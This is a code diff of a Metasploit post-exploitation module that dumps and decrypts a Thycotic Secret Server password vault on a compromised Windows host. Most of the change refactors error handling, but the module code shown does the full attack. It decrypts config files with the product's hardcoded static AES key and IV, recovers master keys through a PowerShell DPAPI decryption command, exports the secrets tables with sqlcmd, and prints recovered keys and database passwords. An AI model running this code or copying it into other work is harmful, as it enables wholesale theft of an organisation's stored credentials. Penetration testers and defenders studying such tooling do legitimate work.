@@ -24,9 +24,7 @@ class MetasploitModule < Msf::Post
           Secret Server installed. Master Encryption Key (MEK) and associated IV values are
           decrypted from encryption.config using a static key baked into the software. The
           module also supports parameter recovery for encryption configs configured with
-          Windows DPAPI. An optional parameter "LOOT_ONLY" allows the encryption keys and
-          encrypted database to be plundered for late offline decryption in situations where
-          expedience is necessary.
+          Windows DPAPI.
         },
         'Author' => 'npm[at]cesium137.io',
         'Platform' => [ 'win' ],
@@ -74,24 +72,25 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    init_module
+    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not initialize') unless init_module
     current_action = action.name.downcase
-    case current_action
-    when 'dump'
-      print_status('Performing export and decryption of Secret Server SQL database')
-      encrypted_csv_file = export
-      print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
-      decrypted_csv_file = decrypt(encrypted_csv_file)
-      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
-    when 'export'
+    if current_action == 'export' || current_action == 'dump'
       print_status('Performing export of Secret Server SQL database to CSV file')
-      encrypted_csv_file = export
+      fail_with(Msf::Exploit::Failure::Unknown, 'Could not export Secret Server database records') unless (encrypted_csv_file = export)
       print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
+    end
+    if current_action == 'dump'
+      print_status('Performing decryption of Secret Server SQL database')
+      fail_with(Msf::Exploit::Failure::Unknown, 'Could not decrypt exported Secret Server database records') unless (decrypted_csv_file = decrypt(encrypted_csv_file))
+      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
     end
   end
 
   def export
-    csv = dump_thycotic_db
+    unless (csv = dump_thycotic_db)
+      print_error('No records exported from SQL server')
+      return false
+    end
     total_rows = csv.count
     print_good("#{total_rows} rows exported, #{@ss_total_secrets} unique SecretIDs")
     encrypted_data = csv.to_s.delete("\000")
@@ -99,7 +98,10 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt(csv_file)
-    fail_with(Msf::Exploit::Failure::NoTarget, 'No records imported from CSV dataset') unless (csv = read_csv_file(csv_file))
+    unless (csv = read_csv_file(csv_file))
+      print_error('No records imported from CSV dataset')
+      return false
+    end
     total_rows = csv.count
     print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
     result = decrypt_thycotic_db(csv)
@@ -109,11 +111,15 @@ class MetasploitModule < Msf::Post
     ss_plaintext_rows = result[:plaintext_rows]
     ss_failed_rows = result[:failed_rows]
     result_rows = result[:result_csv]
-    print_error('Failed to decrypt CSV dataset') unless result_rows
+    unless result_rows
+      print_error('Failed to decrypt CSV dataset')
+      return false
+    end
     total_result_rows = result_rows.count - 1 # Do not count header row
     total_result_secrets = result_rows['SecretID'].uniq.count - 1
     if ss_processed_rows == ss_failed_rows || total_result_rows <= 0
       print_error('No rows could be processed')
+      return false
     elsif ss_failed_rows > 0
       print_warning("#{ss_processed_rows} rows processed (#{ss_failed_rows} rows failed)")
     else
@@ -143,17 +149,19 @@ class MetasploitModule < Msf::Post
         JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
       export_header_row = export_header_row_modern
     end
-    if @ss_db_integrated_auth
-      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
-    else
-      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
-    end
+    sql_cmd = sql_prepare(sql_query)
     print_status('Export Secret Server DB ...')
     query_result = cmd_exec(sql_cmd)
     csv = CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
-    fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Error parsing SQL dataset into CSV format') unless csv
+    unless csv
+      print_error('Error parsing SQL dataset into CSV format')
+      return false
+    end
     @ss_total_secrets = csv['SecretID'].uniq.count
-    fail_with(Msf::Exploit::Failure::NoTarget, 'SQL dataset contains no SecretID column values') unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
+    unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
+      print_error('SQL dataset contains no SecretID column values')
+      return false
+    end
     csv
   end
 
@@ -256,15 +264,36 @@ class MetasploitModule < Msf::Post
     @ss_hostname = get_env('COMPUTERNAME')
     print_status("Hostname #{@ss_hostname} IPv4 #{rhost}")
     get_sql_client
-    fail_with(Failure::Unknown, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
+    unless @sql_client == 'sqlcmd'
+      print_error('Unable to identify sqlcmd SQL client on target host')
+      return false
+    end
     vprint_good("Found SQL client: #{@sql_client}")
-    ss_web_path = get_secretserver_web_path
-    init_thycotic_db(ss_web_path)
+    unless (ss_web_path = get_secretserver_web_path)
+      print_error('Could not determine Secret Server IIS web root filesystem path')
+      return false
+    end
+    unless init_thycotic_db(ss_web_path)
+      print_error('Could not initialize Secret Server database')
+      return false
+    end
     get_secretserver_version
-    init_thycotic_encryption(ss_web_path)
+    unless @ss_build
+      print_error('Could not determine Secret Server build')
+      return false
+    end
+    unless init_thycotic_encryption(ss_web_path)
+      print_error('Could not initialize Secret Server encryption parameters')
+      return false
+    end
+    true
   end
 
   def read_csv_file(file_name)
+    unless File.exist?(file_name)
+      print_error("CSV file #{file_name} not found")
+      return false
+    end
     csv_rows = File.binread(file_name)
     csv = CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
     unless csv
@@ -281,50 +310,68 @@ class MetasploitModule < Msf::Post
 
   def get_secretserver_web_path
     reg_key = 'HKLM\\SOFTWARE\\Thycotic\\Secret Server\\'
-    fail_with(Msf::Exploit::Failure::NotFound, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
+    unless registry_key_exist?(reg_key)
+      print_error("Registry key #{reg_key} not found")
+      return false
+    end
     ss_web_path = registry_getvaldata(reg_key, 'WebDir')
-    fail_with(Msf::Exploit::Failure::NotFound, "Could not find WebDir registry entry under #{reg_key}") unless ss_web_path
+    unless ss_web_path
+      print_error("Could not find WebDir registry entry under #{reg_key}")
+      return false
+    end
     vprint_status('Secret Server Web Root:')
     vprint_status("\t#{ss_web_path}")
     ss_web_path
   end
 
   def get_secretserver_version
-    if @ss_db_integrated_auth
-      version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"
-        SET NOCOUNT ON;
-        SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
-        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
-        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
-        FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
-    else
-      version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"
-        SET NOCOUNT ON;
-        SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
-        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
-        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
-        FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
-    end
-    version_query_result = cmd_exec(version_sql_cmd).gsub("\r", '')
+    sql_query = "SET NOCOUNT ON; SELECT TOP 1
+      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
+      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
+      CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
+      FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC"
+    sql_cmd = sql_prepare(sql_query)
+    version_query_result = cmd_exec(sql_cmd).gsub("\r", '')
     csv = CSV.parse(version_query_result.gsub("\r", ''), row_sep: :auto, headers: 'Major,Minor,Rev', quote_char: "\x00", skip_blanks: true)
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Error parsing SQL dataset into CSV format') unless csv
+    unless csv
+      print_error('Error parsing SQL dataset into CSV format')
+      return false
+    end
     ss_build_major = csv['Major'].first.to_i
     ss_build_minor = csv['Minor'].first.to_i
     ss_build_rev = csv['Rev'].first.to_i
     @ss_build = "#{ss_build_major}.#{ss_build_minor}#{ss_build_rev}".to_f
-    fail_with(Msf::Exploit::Failure::Unknown, 'Error determining Secret Server version from SQL query') unless @ss_build > 0
+    unless @ss_build > 0
+      print_error('Error determining Secret Server version from SQL query')
+      return false
+    end
     print_status("Secret Server Build #{@ss_build}")
     print_warning('This module has not been tested against Secret Server versions below 8.4 and may not work') if @ss_build < 8.4
+    true
+  end
+
+  def sql_prepare(sql_query)
+    if @ss_db_integrated_auth
+      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
+    else
+      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
+    end
+    sql_cmd
   end
 
   def read_config_file(ss_config_file)
-    fail_with(Msf::Exploit::Failure::NotFound, "#{ss_config_file} not found") unless file_exist?(ss_config_file)
+    unless file_exist?(ss_config_file)
+      print_error("Configuration file '#{ss_config_file}' not found")
+      return false
+    end
     read_file(ss_config_file)
   end
 
   def init_thycotic_encryption(ss_web_path)
     print_status('Decrypt encryption.config ...')
     ss_enc_config_file = ss_web_path + 'encryption.config'
+    vprint_status('Encryption configuration file path:')
+    vprint_status("\t#{ss_enc_config_file}")
     ss_enc_conf_bytes = read_config_file(ss_enc_config_file)
     if @ss_build >= 10.4
       vprint_status('Using Modern (AES-256 + XOR) file decryption routine')
@@ -333,7 +380,10 @@ class MetasploitModule < Msf::Post
       vprint_status('Using Legacy (AES-128) file decryption routine')
       enc_conf = thycotic_encryption_config_decrypt_legacy(ss_enc_conf_bytes)
     end
-    fail_with(Msf::Exploit::Failure::Unknown, 'Failed to decrypt encryption.config') unless enc_conf
+    unless enc_conf
+      print_error('Failed to decrypt encryption.config')
+      return false
+    end
     ss_key_hex = enc_conf['KEY']
     ss_key256_hex = enc_conf['KEY256']
     ss_iv_hex = enc_conf['IV']
@@ -342,7 +392,10 @@ class MetasploitModule < Msf::Post
       ss_key_hex = dpapi_decrypt(ss_key_hex)
       ss_key256_hex = dpapi_decrypt(ss_key256_hex)
     end
-    fail_with(Msf::Exploit::Failure::Unknown, "Failed to recover Master Encryption Key values from #{ss_enc_config_file}") if ss_key_hex.nil? || ss_key256_hex.nil? || ss_iv_hex.nil?
+    if ss_key_hex.nil? || ss_key256_hex.nil? || ss_iv_hex.nil?
+      print_error("Failed to recover Master Encryption Key values from #{ss_enc_config_file}")
+      return false
+    end
     @ss_iv = [ss_iv_hex].pack('H*')
     @ss_key = [ss_key_hex].pack('H*')
     @ss_key256 = [ss_key256_hex].pack('H*')
@@ -364,6 +417,7 @@ class MetasploitModule < Msf::Post
     print_good("\t   KEY: #{ss_key_hex}")
     print_good("\tKEY256: #{ss_key256_hex}")
     print_good("\t    IV: #{ss_iv_hex}")
+    true
   end
 
   def thycotic_encryption_config_decrypt_modern(enc_conf_bytes)
@@ -405,6 +459,9 @@ class MetasploitModule < Msf::Post
       i += 1
     end
     res
+  rescue StandardError => e
+    vprint_error("Exception in #{__method__}: #{e.message}")
+    return false
   end
 
   def thycotic_encryption_config_decrypt_legacy(enc_conf_bytes)
@@ -412,10 +469,14 @@ class MetasploitModule < Msf::Post
     # Burned-in static keys and IV
     aes_key_legacy = ['020216980119760c0b79017097830b1d'].pack('H*')
     aes_iv_legacy = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
-    ciphertext_bytes = enc_conf_bytes
-    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key_legacy, aes_iv_legacy).delete("\000"))
+    return false unless (plaintext_conf = aes_cbc_decrypt(enc_conf_bytes, aes_key_legacy, aes_iv_legacy).delete("\000"))
 
-    working_offset = (plaintext_conf.unpack('H*').first.downcase.index(/4b65790556616c7565/) / 2) + 14 # magic bytes
+    plaintext_conf_hex = plaintext_conf.unpack('H*').first
+    unless plaintext_conf_hex.match?(/4b65790556616c7565/i) # magic bytes
+      print_error('Could not locate encryption.config key/value header in binary stream')
+      return false
+    end
+    working_offset = (plaintext_conf_hex.index(/4b65790556616c7565/i) / 2) + 14
     loop do
       k = nil
       v = nil
@@ -438,26 +499,42 @@ class MetasploitModule < Msf::Post
       break if working_offset >= plaintext_conf.length
     end
     res
+  rescue StandardError => e
+    vprint_error("Exception in #{__method__}: #{e.message}")
+    return false
   end
 
   def init_thycotic_db(ss_web_path)
     print_status('Decrypt database.config ...')
     ss_db_config_file = ss_web_path + 'database.config'
-    db_conf = get_thycotic_database_config(read_config_file(ss_db_config_file))
+    vprint_status('Database configuration file path:')
+    vprint_status("\t#{ss_db_config_file}")
+    unless (db_conf = get_thycotic_database_config(read_config_file(ss_db_config_file)))
+      print_error("Error reading database configuration file #{ss_db_config_file}")
+      return false
+    end
     db_instance_path = db_conf['DATA SOURCE']
     db_name = db_conf['INITIAL CATALOG']
     db_user = db_conf['USER ID']
     db_pass = db_conf['PASSWORD']
     db_auth = db_conf['INTEGRATED SECURITY']
-    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover database parameters from #{ss_db_config_file}") if db_instance_path.nil? || db_name.nil?
+    if db_instance_path.nil? || db_name.nil?
+      print_error("Failed to recover database parameters from #{ss_db_config_file}")
+      return false
+    end
     @ss_db_instance_path = db_instance_path
     @ss_db_name = db_name
+    @ss_db_integrated_auth = false
     print_good('Secret Server SQL Database Connection Configuration:')
     print_good("\tInstance Name: #{@ss_db_instance_path}")
     print_good("\tDatabase Name: #{@ss_db_name}")
-    @ss_db_integrated_auth = false
     if !db_auth.nil?
-      @ss_db_integrated_auth = true unless db_auth.downcase != 'true'
+      if db_auth.downcase == 'true'
+        @ss_db_integrated_auth = true
+        print_good("\tDatabase User: (Windows Integrated)")
+        print_warning('The database uses Windows authentication')
+        print_warning('Session identity must have access to the SQL server instance to proceed')
+      end
     elsif !db_user.nil? && !db_pass.nil?
       @ss_db_user = db_user
       @ss_db_pass = db_pass
@@ -476,12 +553,8 @@ class MetasploitModule < Msf::Post
       print_good("\tDatabase User: #{@ss_db_user}")
       print_good("\tDatabase Pass: #{@ss_db_pass}")
     else
-      fail_with(Msf::Exploit::Failure::NoTarget, "Could not extract SQL login information from #{ss_db_config_file}")
-    end
-    if @ss_db_integrated_auth
-      print_good("\tDatabase User: (Windows Integrated)")
-      print_warning('The database uses Windows authentication')
-      print_warning('Session identity must have access to the SQL server instance to proceed')
+      print_error("Could not extract SQL login information from #{ss_db_config_file}")
+      return false
     end
   end
 
@@ -490,8 +563,14 @@ class MetasploitModule < Msf::Post
     # Burned-in static keys and IV
     aes_key = ['020216980119760c0b79017097830b1d'].pack('H*')
     aes_iv = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Error decrypting database.config') unless (plaintext_conf = aes_cbc_decrypt(db_conf_bytes, aes_key, aes_iv).delete("\000"))
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not extract connectionString from database.config') unless (db_str = get_thycotic_database_string(plaintext_conf))
+    unless (plaintext_conf = aes_cbc_decrypt(db_conf_bytes, aes_key, aes_iv).delete("\000"))
+      print_error('Error decrypting database.config')
+      return false
+    end
+    unless (db_str = get_thycotic_database_string(plaintext_conf))
+      print_error('Could not extract connectionString from database.config')
+      return false
+    end
     db_connection_elements = db_str.split(';')
     db_connection_elements.each do |element|
       pair = element.to_s.split('=')
@@ -500,6 +579,9 @@ class MetasploitModule < Msf::Post
       res[k.upcase] = v
     end
     res
+  rescue StandardError => e
+    vprint_error("Exception in #{__method__}: #{e.message}")
+    return false
   end
 
   def get_thycotic_database_string(plaintext_conf)
@@ -591,9 +673,16 @@ class MetasploitModule < Msf::Post
   end
 
   def dpapi_decrypt(b64)
+    unless b64.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
+      print_error('DPAPI decrypt: invalid Base64 ciphertext')
+      return nil
+    end
     cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), $Null, 'LocalMachine'))"
     plaintext = psh_exec(cmd_str)
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed DPAPI LocalMachine decryption') unless plaintext.match?(/^[0-9a-f]+$/i)
+    unless plaintext.match?(/^[0-9a-f]+$/i)
+      print_error('Failed DPAPI LocalMachine decryption')
+      return nil
+    end
     plaintext
   end
 end
